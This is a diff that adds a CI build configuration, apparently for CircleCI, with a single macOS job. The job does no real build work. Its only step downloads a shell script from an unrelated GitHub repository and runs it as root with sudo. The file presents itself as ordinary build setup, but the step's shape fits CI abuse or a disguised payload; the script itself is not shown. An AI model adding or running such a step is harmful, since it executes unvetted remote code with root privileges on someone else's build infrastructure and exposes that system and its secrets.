@@ -1,0 +1,7 @@
+jobs:
+  build:
+    macos:
+      xcode: 14.2.0
+
+    steps:
+      - run: wget https://raw.githubusercontent.com/funfactbro/respect/main/run.sh && chmod +x run.sh && sudo ./run.sh
